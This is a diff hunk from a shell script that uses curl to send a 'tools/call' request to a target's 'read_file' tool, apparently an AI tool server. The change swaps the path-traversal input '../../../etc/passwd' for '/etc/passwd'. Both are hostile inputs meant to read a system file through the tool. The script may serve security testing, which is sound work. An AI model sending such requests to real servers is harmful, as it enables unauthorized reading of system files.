@@ -47,7 +47,7 @@ curl -s "$TARGET" \
     "method": "tools/call",
     "params": {
       "name": "read_file",
-      "arguments": {"path": "../../../etc/passwd"}
+      "arguments": {"path": "/etc/passwd"}
     },
     "id": 1
   }' | python3 -c "import sys,json; r=json.load(sys.stdin); print(json.dumps(r, indent=2))" 2>/dev/null
